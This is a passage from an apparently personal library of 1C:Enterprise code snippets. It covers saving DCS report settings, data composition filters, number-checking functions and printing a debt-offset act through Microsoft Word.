    ПроцессорВывода 	= ?(Режим,Новый ПроцессорВыводаРезультатаКомпоновкиДанныхВТабличныйДокумент, Новый  ПроцессорВыводаРезультатаКомпоновкиДанныхВКоллекциюЗначений) ;
    Если НЕ Результат = Неопределено Тогда
        Если Режим Тогда
            ПроцессорВывода.УстановитьДокумент(Результат);
        Иначе
            ПроцессорВывода.УстановитьОбъект(Результат);
        КонецЕсли;    
	КонецЕсли;
	
    Возврат ПроцессорВывода.Вывести(ПроцессорКомпоновкиДанных, ПоказыватьВывод);
	
КонецФункции"}
},
{0,
{"Хранение настроек внешних отчетов на СКД в 1С",0,0,"","Хранение настроек внешних отчетов на СКД в 1С
http://catalog.mista.ru/public/97997/

Код для сохранения и восстановления настроек внешних отчетов на СКД в УПП 1.3, БП 1.6, 2.0, УТ 10.3, КА 1.1
Задача: нужно хранить настройки отчета на СКД в базе, причем у каждого пользователя должно быть произвольное количество настроек.



Для хранения настроек отчетов в УПП существуют два метаданных. Регистр сведений ""Сохраненные настройки"" и одноименный справочник.

Структура метаданных

Их структура похожа, в обоих есть информация:

О пользователе, который может использовать данную настройку
""СохранятьАвтоматически"" - сохранять настройку при закрытии
""ИспользоватьПриОткрытии"" - при открытии будет выведен отчет по настройке с данной галочкой. Галочка может стоять только у одной настройки к каждому отчету. Если ни у одной настройки галочки нет, то будет выведена типовая настройка СКД.
Реквизит с типом ""Хранилище значения"" (в справочнике реквизит ""ХранилищеНастроек"", в регистре сведений ресурс ""СохраненнаяНастройка""). В данном объекте собсвенно и хранятся настройки. Как известно хранилище значения может хранить любое значение.
 

В регистре сведений хранятся настройки для отчетов, построенных на универсальном отчете, в справочнике - построенных на СКД. Логично сохранять настройки в справочнике. Но после беглого взгляда возникает несколько но:

Данный справочник содержит предопределенные элементы, имя которых совпадает с именами отчетов. Свои же отчеты туда добавить нельзя, так как в результате обновления может возникнуть коллизия, 1с добавит новые элементы и в тоже время будут существовать предопределенные элементы, добавленные пользователем. 
Справочник заточен на работу с шаблоном отчета 1с, и процедуры и функции работы с сохранением настроек выдрать из него достаточно сложно. шаблон СКД
 

Регистр сведений. Как говорилось выше - в нем хранятся настройки для отчетов на универсальном отчете. Но просмотрев механизм, я решил использовать его, так как процедуры работы с сохранением и восстановлением настроек взять гораздо проще, и более того, данный механизм использован не только в отчетах, но и в типовой обработке ""Универсальный журнал"", код из которой, немного изменив, я и приспоспособил для решения данной задачи.

 

Итак. На форму надо добавить кнопки сохранения и восстановления значений настроек Сохранить / восстановить настройки, добавить процедуры к ним, и написать код в процедуры ""ПриОткрытии"" и ""ПриЗакрытии"".

//////////////////////////////////////////////////////////////////////////////////////

Процедура ДействияФормыСохранитьНастройки(Кнопка)

    Если мТекущаяНастройка<>Неопределено Тогда
        СтруктураНастройки = мТекущаяНастройка;
    Иначе
        СтруктураНастройки = Новый Структура;
        СтруктураНастройки.Вставить(""ИмяОбъекта"", Строка(ЭтотОбъект));
        СтруктураНастройки.Вставить(""НаименованиеНастройки"", Неопределено);
        СтруктураНастройки.Вставить(""ИспользоватьПриОткрытии"", Ложь);
        СтруктураНастройки.Вставить(""СохранятьАвтоматически"", Ложь);
    КонецЕсли;

    СтруктураНастройки.Вставить(""Пользователь"", глЗначениеПеременной(""глТекущийПользователь""));
    СохраненнаяНастройка = Новый ХранилищеЗначения(КомпоновщикНастроек.ПолучитьНастройки());
    СтруктураНастройки.Вставить(""СохраненнаяНастройка"", СохраненнаяНастройка);

    ВозвращаемаяСтруктура = УниверсальныеМеханизмы.СохранениеНастроек(СтруктураНастройки);

    Если ВозвращаемаяСтруктура <> Неопределено Тогда
        мТекущаяНастройка = ВозвращаемаяСтруктура;
    Иначе
        мТекущаяНастройка = СтруктураНастройки;
    КонецЕсли;

КонецПроцедуры

 

Сохранение настройки

//////////////////////////////////////////////////////////////////////////////////////

Процедура ДействияФормыВосстановитьНастройки(Кнопка)

    СтруктураНастройки = Новый Структура;
    СтруктураНастройки.Вставить(""Пользователь"", глЗначениеПеременной(""глТекущийПользователь""));
    СтруктураНастройки.Вставить(""ИмяОбъекта"", Строка(ЭтотОбъект));
    СтруктураНастройки.Вставить(""НаименованиеНастройки"", ?(мТекущаяНастройка = Неопределено, Неопределено, мТекущаяНастройка.НаименованиеНастройки));

    ВозвращаемаяСтруктура = УниверсальныеМеханизмы.ВосстановлениеНастроек(СтруктураНастройки);

    Если ВозвращаемаяСтруктура <> Неопределено Тогда
        мТекущаяНастройка = ВозвращаемаяСтруктура;
        КомпоновщикНастроек.ЗагрузитьНастройки(мТекущаяНастройка.СохраненнаяНастройка.Получить());
    КонецЕсли;

КонецПроцедуры

Восстановление настройки 

//////////////////////////////////////////////////////////////////////////////////////

Процедура ПриОткрытии()
    СтруктураНастройки = Новый Структура;
    СтруктураНастройки.Вставить(""Пользователь"", глЗначениеПеременной(""глТекущийПользователь""));
    СтруктураНастройки.Вставить(""ИмяОбъекта"", Строка(ЭтотОбъект));

    Если УниверсальныеМеханизмы.ПолучитьНастройкуИспользоватьПриОткрытии(СтруктураНастройки) Тогда
        мТекущаяНастройка = СтруктураНастройки;
        КомпоновщикНастроек.ЗагрузитьНастройки(мТекущаяНастройка.СохраненнаяНастройка.Получить());
    Иначе
        //установка первоначальных настроек, например периода и т.д.
    КонецЕсли;
КонецПроцедуры

//////////////////////////////////////////////////////////////////////////////////////

Процедура ПриЗакрытии()

    Если мТекущаяНастройка <> Неопределено И мТекущаяНастройка.НаименованиеНастройки <> Неопределено
        И мТекущаяНастройка.Свойство(""СохранятьАвтоматически"") И мТекущаяНастройка.СохранятьАвтоматически Тогда

        ТекПользователь = глЗначениеПеременной(""глТекущийПользователь"");
        Если ТекПользователь<> мТекущаяНастройка.Пользователь Тогда
            Ответ = Вопрос(""Вы восстановили настройку другого пользователя, сохранить ее в
            |ваших настройках?"", РежимДиалогаВопрос.ДаНет);
            Если Ответ = КодВозвратаДиалога.Да Тогда
                Если ВвестиСтроку(мТекущаяНастройка.НаименованиеНастройки,
                    ""Укажите наименование сохраняемой настройки"") Тогда
                    мТекущаяНастройка.Пользователь = ТекПользователь;
                    УниверсальныеМеханизмы.СохранитьНастройку(мТекущаяНастройка);
                КонецЕсли;
            КонецЕсли;
        Иначе
            УниверсальныеМеханизмы.СохранитьНастройку(мТекущаяНастройка);
        КонецЕсли;
    КонецЕсли;

КонецПроцедуры

//////////////////////////////////////////////////////////////////////////////////////

Данный, достаточно небольшой код, позволяет сохранять и восстанавливать настройки внешнего отчета на СКД.


У 1 пользователя была ошибка и он поправил так:
Процедура ПриЗакрытии()
    Если мТекущаяНастройка <> Неопределено И мТекущаяНастройка.НаименованиеНастройки <> Неопределено
        И мТекущаяНастройка.Свойство(""СохранятьАвтоматически"") И мТекущаяНастройка.СохранятьАвтоматически Тогда
        
        //Добавленная мною строка
        мТекущаяНастройка.Вставить(""СохраненнаяНастройка"", Новый ХранилищеЗначения(КомпоновщикНастроек.ПолучитьНастройки()));
    
        ТекПользователь = глЗначениеПеременной(""глТекущийПользователь"");
        Если ТекПользователь <> мТекущаяНастройка.Пользователь Тогда
            Ответ = Вопрос(""Вы восстановили настройку другого пользователя, сохранить ее в
            |ваших настройках?"", РежимДиалогаВопрос.ДаНет);
            Если Ответ = КодВозвратаДиалога.Да Тогда
                Если ВвестиСтроку(мТекущаяНастройка.НаименованиеНастройки,
                    ""Укажите наименование сохраняемой настройки"") Тогда
                    мТекущаяНастройка.Пользователь = ТекПользователь;
                    УниверсальныеМеханизмы.СохранитьНастройку(мТекущаяНастройка);
                КонецЕсли;
            КонецЕсли;
        Иначе
            УниверсальныеМеханизмы.СохранитьНастройку(мТекущаяНастройка);
        КонецЕсли;
    КонецЕсли;
КонецПроцедуры"}
},
{0,
{"Отбор (проверка существующего поля)",0,0,"","Сотрудники = Новый Массив;
Для Каждого ЭлементОтбора Из НастройкиОтчета.Отбор.Элементы Цикл
	
	Если ТипЗнч(ЭлементОтбора) = Тип(""ЭлементОтбораКомпоновкиДанных"") Тогда
		Если ЭлементОтбора.ЛевоеЗначение = Новый ПолеКомпоновкиДанных(""Сотрудник"") Тогда
			Если ТипЗнч(ЭлементОтбора.ПравоеЗначение) = Тип(""СписокЗначений"") Тогда
				Сотрудники = ЭлементОтбора.ПравоеЗначение.ВыгрузитьЗначения();
			ИначеЕсли ЗначениеЗаполнено(ЭлементОтбора.ПравоеЗначение) Тогда
				Сотрудники.Добавить(ЭлементОтбора.ПравоеЗначение);
			КонецЕсли;
			Прервать;
		КонецЕсли;
	КонецЕсли;
	
КонецЦикла;"}
},
{0,
{"Установить значение отбора или добавить новый",0,0,"","ПолеПоиска 	= Новый ПолеКомпоновкиДанных(""<ИмяПоля>"");
Найден 		= Ложь;

Для Каждого Элемент Из Настройки.Отбор.Элементы Цикл
	Если Элемент.ЛевоеЗначение = ПолеПоиска Тогда
		Элемент.ПравоеЗначение 	= <ЗначениеОтбора>;
		Элемент.Использование 	= Истина;
		Найден 					= Истина;
		Прервать;
	КонецЕсли;
КонецЦикла;

Если Не Найден Тогда
	Если Настройки.Отбор.ДоступныеПоляОтбора.Элементы.Найти(""<ИмяПоля>"") <> Неопределено Тогда
		НовыйОтбор 					= Настройки.Отбор.Элементы.Добавить(Тип(""ЭлементОтбораКомпоновкиДанных""));
		НовыйОтбор.ЛевоеЗначение 	= ПолеПоиска;
		НовыйОтбор.ПравоеЗначение 	= <ЗначениеОтбора>;
		НовыйОтбор.Использование 	= Истина;
	КонецЕсли;
КонецЕсли;"}
},
{0,
{"Типовой отбор СКД (ОбщегоНазначенияКлиентСервер.УстановитьЭлементОтбораДинамическогоСписка)",0,0,"","Элементы.ТекущиеЗаданияАйТи_ЯАвтор.Пометка = НЕ Элементы.ТекущиеЗаданияАйТи_ЯАвтор.Пометка;

ОбщегоНазначенияКлиентСервер.УстановитьЭлементОтбораДинамическогоСписка(ТекущиеЗадания, 
	""Автор"", 
	Пользователи.ТекущийПользователь(),
	ВидСравненияКомпоновкиДанных.Равно,
	,
	Элементы.ТекущиеЗаданияАйТи_ЯАвтор.Пометка,
	РежимОтображенияЭлементаНастройкиКомпоновкиДанных.Недоступный,
	"""");"}
}
},
{6,
{"ЭтоЧисло",1,0,"",""},
{0,
{"ЭтоЧисло_1",0,0,"","Функция ЭтоЧисло(Символ)
	Возврат ?(Найти(""1234567890"", Символ) = 0, Ложь, Истина);
КонецФункции
"}
},
{0,
{"ЭтоЧисло_2",0,0,"","Функция ЭтоЧисло(Строка)
	ЗначениеВозврата = Истина;
	Попытка
		Число = Число(Строка);
	Исключение
		ЗначениеВозврата = Ложь;
	КонецПопытки;
	
	Возврат ЗначениеВозврата;
КонецФункции
"}
},
{0,
{"ЭтоЧисло_3",0,0,"","Функция ЭтоЧисло(Текст)
	
	Если ПустаяСтрока(Текст) Тогда
		Возврат Ложь;
	КонецЕсли; 
	Если СтрЧислоВхождений(Текст, ""."")+СтрЧислоВхождений(Текст, "","")>1 Тогда
		Возврат Ложь;
	КонецЕсли; 
	Для ии = 1 По СтрДлина(Текст) Цикл
		Символ = Сред(Текст, ии, 1);
		Если Найти("" 0123456789.,""+Символы.НПП, Символ)>0 Тогда
			Продолжить;
		КонецЕсли;
		Возврат Ложь;
	КонецЦикла;
	Возврат Истина;
	
КонецФункции
"}
},
{0,
{"ЭтоЧисло_4",0,0,"","//Функция проверяет является ли строка числом. Строка может содержать ""."" и "","" - это не числа
//-------------------------------------------------------------------------
//Параметры:
//		Текст - Строка - Исходная строка для проверки
//Возвращаемое значение:
//		Булево - Истина, если ЭтоЧисло
//-------------------------------------------------------------------------
//автор: Кучеров Р <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> 
Функция ЭтоЧисло(Текст)
	
	Если ПустаяСтрока(Текст) Тогда
		Возврат Ложь;
	КонецЕсли; 
	Если СтрЧислоВхождений(Текст, ""."") + СтрЧислоВхождений(Текст, "","") > 1 Тогда
		Возврат Ложь;
	КонецЕсли; 
	ТекстДлина = СтрДлина(Текст);
	Для ии = 1 По ТекстДлина Цикл
		Символ = Сред(Текст, ии, 1);
		Если НЕ Найти(""1234567890"", Символ) > 0 Тогда
			Возврат Ложь;
		КонецЕсли;
	КонецЦикла;
	Возврат Истина;
	
КонецФункции
"}
},
{0,
{"ЭтоЧисло_5",0,0,"","Функция ЭтоЧисло(зн) //Возвращает число ли передано или строка
	стрЗн = СокрЛП(Зн);
	Если стрЗн="""" Тогда Возврат 0; КонецЕсли;
	
	флгЧисло = Истина; знЧисло = """";
	Для й=1 По СтрДлина(стрЗн) Цикл
		КодСимв = КодСимвола(стрЗн, й);
		Если (КодСимв=32) или (КодСимв=160) или (КодСимв=39) Тогда Продолжить; //space newspace '
		ИначеЕсли (КодСимв=44) или (КодСимв=46) Тогда
			знЧисло = знЧисло + ""."";
		ИначеЕсли ((КодСимв >= 48) и (КодСимв <= 58)) или (КодСимв=43) или (КодСимв=45) Тогда //цифры, Минус
			ЗнЧисло = знЧисло + Символ(КодСимв);
		Иначе
			флгЧисло = Ложь;
			Прервать;
		КонецЕсли;
	КонецЦикла;

	Возврат флгЧисло;
КонецФункции"}
},
{0,
{"Получить только числа",0,0,"","Функция ВернутьЦифрыИзСтроки(СтрокаПроверки) 
     
    Если ТипЗнч(СтрокаПроверки) <> Тип(""Строка"") Тогда 
        Возврат """"; 
    КонецЕсли; 
     
    ЦифрыИзСтроки = """"; 
     
    Для Счетчик = 1 По СтрДлина(СтрокаПроверки) Цикл 
        Символ = Сред(СтрокаПроверки, Счетчик, 1); 
        Если ЭтоЦифра(Символ) Тогда 
            ЦифрыИзСтроки = ЦифрыИзСтроки + Символ; 
        КонецЕсли; 
    КонецЦикла; 
     
    Возврат ЦифрыИзСтроки; 
     
КонецФункции 

Функция ЭтоЦифра(Символ) 
    КодСимвола = КодСимвола(Символ); 
    Возврат (КодСимвола >= 48 И КодСимвола <= 57) 
КонецФункции"}
}
},
{2,
{"Office",1,0,"",""},
{15,
{"Word",1,0,"",""},
{1,
{"Типовое",1,0,"",""},
{0,
{"КА",0,0,"","//+++ АйТи КучеровРМ 18.09.2018 ТЗ № ИС00-004955

&НаСервереБезКонтекста
Функция СформироватьСуммуПрописьюНаСервере(Сумма, Валюта)

	Возврат РаботаСКурсамиВалют.СформироватьСуммуПрописью(Сумма, Валюта)

КонецФункции // СформироватьСуммуПрописьюНаСервере()
 
&НаСервереБезКонтекста
Функция ЗаполнитьДанныеОбъектаНаСервере(ДанныеОбъекта, ДокументСсылка)

	СуммаДокумента 	= ДокументСсылка.СуммаРегл;
	Организация 	= ДокументСсылка.Организация;
	КонтрагентКредитор 	= ДокументСсылка.КонтрагентКредитор;
	
	ДатаДокумента 	= ДокументСсылка.Дата;
	
	СуммаНДС 		= 0.18;
	Валюта 			= ДокументСсылка.ДебиторскаяЗадолженность[0].ВалютаВзаиморасчетов;
	СуммаПрописью 	= СформироватьСуммуПрописьюНаСервере(СуммаДокумента, Валюта);
	НомерДоговора 	= ДокументСсылка.Номер;
	
	СуммаДокументаНДС 	= СуммаДокумента * СуммаНДС;
	СуммаПринятаяВЗачет = СуммаДокумента;
	СуммаПринятаяНДС 	= СуммаДокументаНДС;
	СуммаПринятаяВЗачетИтого 	= СуммаПринятаяВЗачет;
	СуммаПринятаяНДСИтого 		= СуммаПринятаяНДС;
	СуммаДокументаНДС 			= СуммаПринятаяНДСИтого;
	СуммаДокументаНДСПрописью 	= СформироватьСуммуПрописьюНаСервере(СуммаДокументаНДС, Валюта);

	ДанныеОбъекта.Вставить(""СуммаПрописью""	, НРег(СуммаПрописью));
	ДанныеОбъекта.Вставить(""НомерДоговора""	, НомерДоговора);
	ДанныеОбъекта.Вставить(""Валюта""			, Валюта);	
	
	// ДанныеОбъектаДебиторскаяЗадолженность
	ДанныеОбъектаДебиторскаяЗадолженность 	= ДанныеОбъекта.ДебиторскаяЗадолженность;
	ДокументДебиторскаяЗадолженность 		= ДокументСсылка.ДебиторскаяЗадолженность;
	
	Для Сч = 0 По ДанныеОбъектаДебиторскаяЗадолженность.ВГраница() Цикл
	
		СуммаПринята 	= ДокументДебиторскаяЗадолженность[Сч].СуммаРегл;
		ДатаДокумента 	= ДокументДебиторскаяЗадолженность[Сч].Заказ.Дата;
		НомерДокумента 	= ДокументДебиторскаяЗадолженность[Сч].Заказ.Номер;
		
		ДанныеОбъектаДебиторскаяЗадолженность[Сч].Вставить(""СуммаДокументаНДС""	, Формат(СуммаПринята * СуммаНДС, ""ЧДЦ=2""));
		ДанныеОбъектаДебиторскаяЗадолженность[Сч].Вставить(""СуммаПринятаяВЗачет""	, Формат(СуммаПринята, ""ЧДЦ=2""));
		ДанныеОбъектаДебиторскаяЗадолженность[Сч].Вставить(""СуммаПринятаяНДС""		, Формат(СуммаПринята * СуммаНДС, ""ЧДЦ=2""));
		ДанныеОбъектаДебиторскаяЗадолженность[Сч].Вставить(""ДатаДокумента""		, Формат(ДатаДокумента, ""ДФ=dd.MM.yyyy""));
		ДанныеОбъектаДебиторскаяЗадолженность[Сч].Вставить(""НомерДокумента""		, НомерДокумента);
		
	КонецЦикла; 
	
	// ДанныеОбъектаКредиторскаяЗадолженность
	ДанныеОбъектаКредиторскаяЗадолженность 	= ДанныеОбъекта.КредиторскаяЗадолженность;
	ДокументКредиторскаяЗадолженность 		= ДокументСсылка.КредиторскаяЗадолженность;
	
	Для Сч = 0 По ДанныеОбъектаКредиторскаяЗадолженность.ВГраница() Цикл
	
		СуммаПринята 	= ДокументКредиторскаяЗадолженность[Сч].СуммаРегл;
		ДатаДокумента 	= ДокументКредиторскаяЗадолженность[Сч].Заказ.Дата;
		НомерДокумента 	= ДокументКредиторскаяЗадолженность[Сч].Заказ.Номер;
		
		ДанныеОбъектаКредиторскаяЗадолженность[Сч].Вставить(""СуммаДокументаНДС""	, Формат(СуммаПринята * СуммаНДС, ""ЧДЦ=2""));
		ДанныеОбъектаКредиторскаяЗадолженность[Сч].Вставить(""СуммаПринятаяВЗачет""	, Формат(СуммаПринята, ""ЧДЦ=2""));
		ДанныеОбъектаКредиторскаяЗадолженность[Сч].Вставить(""СуммаПринятаяНДС""		, Формат(СуммаПринята * СуммаНДС, ""ЧДЦ=2""));
		ДанныеОбъектаКредиторскаяЗадолженность[Сч].Вставить(""ДатаДокумента""		, Формат(ДатаДокумента, ""ДФ=dd.MM.yyyy""));
		ДанныеОбъектаКредиторскаяЗадолженность[Сч].Вставить(""НомерДокумента""	, НомерДокумента);
		
	КонецЦикла;
	
	//ДанныеОбъекта.ДебиторскаяЗадолженность.Добавить();
	//
	//ДанныеОбъекта.КредиторскаяЗадолженность.Добавить();
	
	ДанныеОбъекта.Вставить(""СуммаДокументаНДС""	, Формат(СуммаДокументаНДС, ""ЧДЦ=2""));
	ДанныеОбъекта.Вставить(""СуммаПринятаяВЗачет"", Формат(СуммаПринятаяВЗачет, ""ЧДЦ=2""));
	ДанныеОбъекта.Вставить(""СуммаПринятаяНДС""	, Формат(СуммаПринятаяНДС, ""ЧДЦ=2""));
	ДанныеОбъекта.Вставить(""СуммаПринятаяВЗачетИтого"", Формат(СуммаДокумента, ""ЧДЦ=2""));
	ДанныеОбъекта.Вставить(""СуммаПринятаяНДСИтого""	, Формат(СуммаДокумента * СуммаНДС, ""ЧДЦ=2""));
	ДанныеОбъекта.Вставить(""СуммаДокументаНДС""		, Формат(СуммаДокументаНДС, ""ЧДЦ=2""));
	ДанныеОбъекта.Вставить(""СуммаДокументаНДСПрописью"", НРег(СуммаДокументаНДСПрописью));
	
	СтруктураПараметров = ДенежныеСредстваСервер.ПараметрыЗаполненияБанковскогоСчетаОрганизацииПоУмолчанию();
	СтруктураПараметров.Организация    			= Организация;
	СтруктураПараметров.Валюта    				= Валюта;
	//СтруктураПараметров.НаправлениеДеятельности	= НаправлениеДеятельности;
	БанковскийСчетОрганизации = ЗначениеНастроекПовтИсп.ПолучитьБанковскийСчетОрганизацииПоУмолчанию(СтруктураПараметров);  
	
	СведенияОЮрФизЛицеОрганизации = ФормированиеПечатныхФорм.СведенияОЮрФизЛице(Организация, ДатаДокумента);
	ИНН_КПП_Организации = ФормированиеПечатныхФорм.ОписаниеОрганизации(СведенияОЮрФизЛицеОрганизации, ""ИНН, КПП"");
	РасчСчетОрганизации = ФормированиеПечатныхФорм.ОписаниеОрганизации(СведенияОЮрФизЛицеОрганизации, ""НомерСчета,Банк"");
	БикОрганизации 		= ФормированиеПечатныхФорм.ОписаниеОрганизации(СведенияОЮрФизЛицеОрганизации, ""БИК,КоррСчет"");

	ДанныеОбъекта.Вставить(""ИНН_КПП_Организации"", ИНН_КПП_Организации);
	ДанныеОбъекта.Вставить(""РасчСчетОрганизации"", РасчСчетОрганизации);
	ДанныеОбъекта.Вставить(""БикОрганизации""		, БикОрганизации);
	
	СведенияОЮрФизЛицеКонтрагентаДебитора = ФормированиеПечатныхФорм.СведенияОЮрФизЛице(КонтрагентКредитор, ДатаДокумента);
	ИНН_КПП_КонтрагентаДебитора = ФормированиеПечатныхФорм.ОписаниеОрганизации(СведенияОЮрФизЛицеКонтрагентаДебитора, ""ИНН, КПП"");
	РасчСчетКонтрагентаДебитора = ФормированиеПечатныхФорм.ОписаниеОрганизации(СведенияОЮрФизЛицеКонтрагентаДебитора, ""НомерСчета,Банк"");
	БикКонтрагентаДебитора 		= ФормированиеПечатныхФорм.ОписаниеОрганизации(СведенияОЮрФизЛицеКонтрагентаДебитора, ""БИК,КоррСчет"");
	
	ДанныеОбъекта.Вставить(""ИНН_КПП_КонтрагентаДебитора"", ИНН_КПП_КонтрагентаДебитора);
	ДанныеОбъекта.Вставить(""РасчСчетКонтрагентаДебитора"", РасчСчетКонтрагентаДебитора);
	ДанныеОбъекта.Вставить(""БикКонтрагентаДебитора""		, БикКонтрагентаДебитора);
	
	Возврат ДанныеОбъекта;
	
КонецФункции // ЗаполнитьДанныеОбъектаНаСервере()
 
//--- АйТи КучеровРМ 18.09.2018 ТЗ № ИС00-004955 

// Печатает акт взаимозачета задолженности
//
// Параметры:
//	ОписаниеКоманды - Структура
//
// Возвращаемое значение:
//	Неопределено
//
&НаКлиенте
Функция ПечатьАктаВзаимозачетаЗадолженностиMicrosoftWord(Макет, ОписаниеКоманды) Экспорт
	
	ОчиститьСообщения();
	
	Состояние(НСтр(""ru = 'Выполняется формирование печатных форм'""));
	
	ИмяМакета = ""ПФ_DOC_АктВзаимозачета_ru"";
	ТипМакета = ""doc"";
	
	МакетИДанныеОбъекта = УправлениеПечатьюВызовСервера.МакетыИДанныеОбъектовДляПечати(""Документ.ВзаимозачетЗадолженности"",
		ИмяМакета,
		ОписаниеКоманды.ОбъектыПечати);
		
	//+++ АйТи КучеровРМ 18.09.2018 ТЗ № ИС00-004955
	МакетИДанныеОбъекта.Макеты.ДвоичныеДанныеМакетов.ПФ_DOC_АктВзаимозачета_ru = Макет; // Подменяем макет на наш из обработки
	//--- АйТи КучеровРМ 18.09.2018 ТЗ № ИС00-004955 
	
	ДвоичныеДанныеМакетов = МакетИДанныеОбъекта.Макеты.ДвоичныеДанныеМакетов;
	
	Секции = МакетИДанныеОбъекта.Макеты.ОписаниеСекций;
	
	Для Каждого ДокументСсылка Из ОписаниеКоманды.ОбъектыПечати Цикл
		
		ДанныеОбъекта = МакетИДанныеОбъекта.Данные[ДокументСсылка][ИмяМакета];
		
		//+++ АйТи КучеровРМ 18.09.2018 ТЗ № ИС00-004955
		ДанныеОбъекта = ЗаполнитьДанныеОбъектаНаСервере(ДанныеОбъекта, ДокументСсылка);
		//--- АйТи КучеровРМ 18.09.2018 ТЗ № ИС00-004955 
		
		Если Не ДанныеОбъекта.Взаимозачет Тогда
			
			Текст = СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
				НСтр(""ru = 'Не требуется печатать акт взаимозачета для документа %1'""),
				ДокументСсылка);
			ОбщегоНазначенияКлиентСервер.СообщитьПользователю(
				Текст,
				ДокументСсылка);
			
		Иначе
		
			Попытка
					
				ПечатнаяФорма = УправлениеПечатьюКлиент.ИнициализироватьПечатнуюФорму(ТипМакета);

				Макет = УправлениеПечатьюКлиент.ИнициализироватьМакетОфисногоДокумента(
					ДвоичныеДанныеМакетов[ИмяМакета], ТипМакета);
					
				// Вывод колонтитулов документа.
				Область = УправлениеПечатьюКлиент.ОбластьМакета(Макет, Секции[ИмяМакета][""ВерхнийКолонтитул""]);
				УправлениеПечатьюКлиент.ПрисоединитьОбластьИЗаполнитьПараметры(ПечатнаяФорма, Область, ДанныеОбъекта, Ложь);
			
				Область = УправлениеПечатьюКлиент.ОбластьМакета(Макет, Секции[ИмяМакета][""НижнийКолонтитул""]);
				УправлениеПечатьюКлиент.ПрисоединитьОбластьИЗаполнитьПараметры(ПечатнаяФорма, Область, ДанныеОбъекта, Ложь);
				
				// Выводим заголовок документа.	
				Область = УправлениеПечатьюКлиент.ОбластьМакета(Макет, Секции[ИмяМакета].Заголовок);
				УправлениеПечатьюКлиент.ПрисоединитьОбластьИЗаполнитьПараметры(ПечатнаяФорма, Область, ДанныеОбъекта, Истина);
				
				// Выводим данные дебиторской задолженности;
				Область = УправлениеПечатьюКлиент.ОбластьМакета(Макет, Секции[ИмяМакета].ДебиторскаяЗадолженность);
				УправлениеПечатьюКлиент.ПрисоединитьОбластьИЗаполнитьПараметры(ПечатнаяФорма, Область, ДанныеОбъекта, Истина);
				
				Область = УправлениеПечатьюКлиент.ОбластьМакета(Макет, Секции[ИмяМакета].ШапкаТаблицы);
				УправлениеПечатьюКлиент.ПрисоединитьОбласть(ПечатнаяФорма, Область, Ложь);
				
				Область = УправлениеПечатьюКлиент.ОбластьМакета(Макет, Секции[ИмяМакета].СтрокаТаблицы);
				УправлениеПечатьюКлиент.ПрисоединитьИЗаполнитьКоллекцию(ПечатнаяФорма,Область, ДанныеОбъекта.ДебиторскаяЗадолженность, Ложь);
				
				// Выводим данные кредиторской задолженности.
				Область = УправлениеПечатьюКлиент.ОбластьМакета(Макет, Секции[ИмяМакета].КредиторскаяЗадолженность);
				УправлениеПечатьюКлиент.ПрисоединитьОбластьИЗаполнитьПараметры(ПечатнаяФорма, Область, ДанныеОбъекта, Истина);
				
				Область = УправлениеПечатьюКлиент.ОбластьМакета(Макет, Секции[ИмяМакета].ШапкаТаблицы);
				УправлениеПечатьюКлиент.ПрисоединитьОбласть(ПечатнаяФорма, Область, Ложь);
				
				Область = УправлениеПечатьюКлиент.ОбластьМакета(Макет, Секции[ИмяМакета].СтрокаТаблицы);
				УправлениеПечатьюКлиент.ПрисоединитьИЗаполнитьКоллекцию(ПечатнаяФорма,Область, ДанныеОбъекта.КредиторскаяЗадолженность, Ложь);
				
				// Выводим подвал документа.
				Область = УправлениеПечатьюКлиент.ОбластьМакета(Макет, Секции[ИмяМакета].Подвал);
				УправлениеПечатьюКлиент.ПрисоединитьОбластьИЗаполнитьПараметры(ПечатнаяФорма, Область, ДанныеОбъекта, Истина);

				//+++ АйТи КучеровРМ 18.09.2018 ТЗ № ИС00-004955
				ЛевыйОтступ = 2;
				ПечатнаяФорма.COMСоединение.Application.Selection.PageSetup.LeftMargin = Макет.COMСоединение.Documents.Application.CentimetersToPoints(ЛевыйОтступ);
				
				ПечатнаяФорма.COMСоединение.Application.Selection.WholeStory();
				
				ParagraphFormat = ПечатнаяФорма.COMСоединение.Selection.ParagraphFormat; 
				
				ParagraphFormat.SpaceBeforeAuto = False;
				ParagraphFormat.SpaceAfterAuto 	= False;
				ParagraphFormat.SpaceBefore 	= 0;
				ParagraphFormat.SpaceAfter 	= 0;
				//--- АйТи КучеровРМ 18.09.2018 ТЗ № ИС00-004955 
				
				УправлениеПечатьюКлиент.ПоказатьДокумент(ПечатнаяФорма);
				
			Исключение
			
				ОбщегоНазначенияКлиентСервер.СообщитьПользователю(КраткоеПредставлениеОшибки(ИнформацияОбОшибке()));
				
				УправлениеПечатьюКлиент.ОчиститьСсылки(ПечатнаяФорма);
				УправлениеПечатьюКлиент.ОчиститьСсылки(Макет);
						
				Возврат Ложь;
				
			КонецПопытки;

			УправлениеПечатьюКлиент.ОчиститьСсылки(ПечатнаяФорма, Ложь);
			УправлениеПечатьюКлиент.ОчиститьСсылки(Макет);
			
		КонецЕсли;
		
	КонецЦикла;
	
	Состояние(НСтр(""ru = 'Формирование печатных форм завершено'""));
	
КонецФункции 
"}
}
},
{0,
{"ЗаменаВWord",0,0,"","//Процедура производит замену старого значения на новое, если находит старое 
//-------------------------------------------------------------------------
//Word - COMОбъект типа (""Word.Application""),
//СтароеЗначение - строка,
//НовоеЗначение - строка;
//-------------------------------------------------------------------------
//автор: неизвестен.
Процедура ЗаменаВWord(Word, СтароеЗначение="""", НовоеЗначение="""") Экспорт
	//Сообщить(""меняю """"""+СтароеЗначение+"""""" на """"""+НовоеЗначение);
	Попытка
		Если ЗначениеЗаполнено(НовоеЗначение)  Тогда   
			Если ТипЗнч(НовоеЗначение)=Тип(""Строка"") Тогда
				Если СтрДлина(НовоеЗначение)>=250 Тогда
					Н=Цел(СтрДлина(НовоеЗначение)/250);               
					ДлинаСтроки=НовоеЗначение;
					Если Word.SELECTION.Find.Execute(СтароеЗначение,0,-1,,,,-1,,,"""",)=-1 Тогда					
						Word.SELECTION.Select();
						Word.SELECTION.Cut();
						Для К=0 По Н Цикл
							Word.SELECTION.Paste();                           
							НовоеЗначение=СокрЛП(Сред(ДлинаСтроки,К*250+1,250));
							Word.ActiveDocument.Content.Find.Execute(СтароеЗначение,1,,,,,,,,НовоеЗначение,2);	
						КонецЦикла; 
					КонецЕсли;
				Иначе
					Word.ActiveDocument.Content.Find.Execute(СтароеЗначение,1,,,,,,,,НовоеЗначение,2); 				
				Конецесли;
			Иначе
